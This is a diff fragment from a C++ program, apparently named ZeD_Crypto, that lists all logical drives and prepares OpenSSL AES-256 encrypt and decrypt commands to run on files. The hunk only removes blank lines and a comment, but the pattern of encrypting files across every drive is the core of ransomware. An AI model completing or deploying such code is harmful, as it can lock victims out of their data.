@@ -51,14 +51,11 @@ int main()
 	GetLogicalDriveStrings(255, sz_buffer);
 	std::vector<std::string> paths;
 
-
-	
-
 	//system("C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//test.txt -pass passwd.txt"); //-"openssl aes-256-cbc -a -salt -pbkdf2 -in C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//testenc.txt"
 	
 	 std::string ENCRYPT_COMMAND = "openssl aes-256-cbc -a -salt -pbkdf2 -in ";
 	 std::string DECRYPT_COMMAND = "openssl aes-256-cbc -d -a -salt -pbkdf2 -in ";
-	//std::string file_crypt;
+
 
 	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1) 
 	{
